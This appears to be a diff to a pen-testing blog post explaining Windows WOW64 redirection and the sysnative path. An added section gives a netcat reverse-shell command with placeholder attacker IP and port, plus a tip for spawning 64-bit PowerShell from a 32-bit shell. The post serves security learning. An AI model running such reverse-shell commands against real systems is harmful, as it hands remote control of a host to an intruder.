@@ -8,9 +8,11 @@ headline: 'WOW64 '
 description: What you need to know as a pen tester.
 modified: '2019-03-01'
 categories:
+  - personal
   - hacking
   - windows
 tags: hacking windows wow64 powershell sysnative
+imagefeature: ''
 ---
 ## The Problem
 
@@ -32,6 +34,42 @@ Windows 64-bit libraries and executables are located in the _%SYSTEMROOT%\system
 
 Windows 32-bit libraries and executables are located in the _%SYSTEMROOT%\syswow64_ directory, but instead of having to modify paths in source code, WOW64 transparent redirects 32-bit app calls from _%SYSTEMROOT%\system32_ to _%SYSTEMROOT%\syswow64_.
 
-Here's what you really need to know:
+> A 32-bit app can also explicitly access 64-bit versions using the _%SYSTEMROOT%\sysnative_ path (not visible in Windows Explorer).
 
-A 32-bit app can also explicitly access 64-bit versions using the %SYSTEMROOT%\sysnative path (not visible in Windows Explorer).
+~~~
+32-bit app > 32-bit versions > \system32 ( secretly redirected to \syswow64)
+32-bit app > 64-bit versions > \sysnative
+~~~
+
+> A 64-bit application can also access 32-bit versions directly using \syswow64.
+
+~~~
+64-bit app > 32-bit versions > \syswow64
+~~~
+
+## Netcat Example
+
+When spawning a command shell from a Windows system, in many situations you might transfer nc.exe to the host to spawn a reverse shell using the _-e cmd.exe_ switch.  Because the nc.exe binary is 32-bit, it will call the 32-bit version of cmd.exe and any commands you use will be 32-bit versions, including powershell.exe. 
+
+There's a few ways around this if needed:
+
+Explictly spawn the 64-bit version of cmd.exe with netcat if you are certain your target is 64-bit:
+
+~~~
+nc -e %SYSTEMROOT%\sysnative\cmd.exe ATTACKER-IP ATTACKER-PORT
+~~~
+
+Spawn the 32-bit cmd.exe but explicitly call 64-bit versions of apps, using  the sysnative path.
+Here's an example I had to use recently to explicitly open a 64-bit powershell prompt from a 32-bit cmd.exe shell.
+
+~~~
+%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe
+~~~
+
+## Further Reading
+
+- [WOW64 Implementation](https://www.google.com/url?q=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fwindows%2Fwin32%2Fwinprog64%2Fwow64-implementation-details&sa=D&sntz=1&usg=AFQjCNGd8WizV4rztmURfGV_gTqyJ1J-dQ)
+- [Running 32-Bit Applications](https://www.google.com/url?q=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fwindows%2Fwin32%2Fwinprog64%2Frunning-32-bit-applications&sa=D&sntz=1&usg=AFQjCNGZLoBioW3ekJr23FDLA8eWWBiqaA)
+- [Accessing Alternate Registry Views](https://www.google.com/url?q=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fwindows%2Fwin32%2Fwinprog64%2Faccessing-an-alternate-registry-view&sa=D&sntz=1&usg=AFQjCNFqcilC4yY0Yz4u-yOfEQxsiKuwzw)
+
+
